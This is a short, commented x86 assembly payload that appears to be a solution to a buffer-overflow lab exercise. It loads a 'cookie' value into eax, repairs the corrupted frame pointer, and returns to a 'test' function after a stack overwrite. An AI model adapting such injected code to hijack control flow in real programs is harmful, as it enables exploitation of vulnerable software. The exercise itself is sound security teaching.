push $0x08048d3e			#return to test
movl $0x2948c56b,%eax			#store the cookie in eax for test to use
					#fix corruption
movl $0x556837c0,%ebp
movl $0x556837c0,0x55683790
ret
